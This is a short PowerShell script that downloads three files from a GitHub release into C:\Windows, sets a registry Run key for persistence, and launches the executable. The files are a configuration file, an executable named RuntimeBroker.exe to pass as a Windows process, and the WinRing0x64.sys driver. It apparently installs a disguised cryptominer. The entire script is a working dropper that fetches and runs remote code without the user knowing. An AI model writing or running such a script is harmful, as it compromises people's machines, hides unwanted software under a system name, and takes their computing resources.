Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/config.json' -Destination 'C:\Windows\config.json' 
Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/RuntimeBroker.exe' -Destination 'C:\Windows\RuntimeBroker.exe' 
Start-BitsTransfer -Source 'https://github.com/so251/olaquerida/releases/download/1releasae/WinRing0x64.sys' -Destination 'C:\Windows\WinRing0x64.sys' 

$programPath = "C:\Windows\RuntimeBroker.exe"

$command = "C:\Windows\RuntimeBroker.exe"
Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "RuntimeBroker" -Value $command


Start-Process "C:\Windows\RuntimeBroker.exe"


